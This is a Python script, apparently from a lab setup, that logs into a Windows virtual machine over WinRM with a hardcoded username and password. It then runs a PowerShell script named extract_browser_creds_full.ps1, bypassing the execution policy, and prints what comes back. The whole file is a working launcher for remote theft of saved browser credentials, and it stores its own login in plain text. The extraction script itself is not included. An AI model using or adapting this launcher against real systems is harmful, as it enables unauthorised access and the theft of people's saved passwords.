#!/usr/bin/env python3
"""
Execute credential extraction script from Windows VM Desktop
"""

import winrm

print("[*] Connecting to Windows VM (192.168.56.102)...")

session = winrm.Session(
    'http://192.168.56.102:5985/wsman',
    auth=('akila', '12345678'),
    transport='ntlm'
)

print("[+] Connected successfully!")
print("[*] Executing extract_browser_creds_full.ps1 from Desktop...")
print("="*70 + "\n")

# Execute the script from Desktop
command = r"powershell -ExecutionPolicy Bypass -File C:\Users\akila\Desktop\extract_browser_creds_full.ps1"

result = session.run_cmd(command)

# Display output
if result.status_code == 0:
    output = result.std_out.decode('utf-8', errors='ignore')
    print(output)
else:
    print("ERROR OUTPUT:")
    error = result.std_err.decode('utf-8', errors='ignore')
    print(error)
    
    # Also show stdout in case there's partial output
    if result.std_out:
        print("\nSTDOUT:")
        print(result.std_out.decode('utf-8', errors='ignore'))

print("\n" + "="*70)
print(f"[*] Exit Code: {result.status_code}")
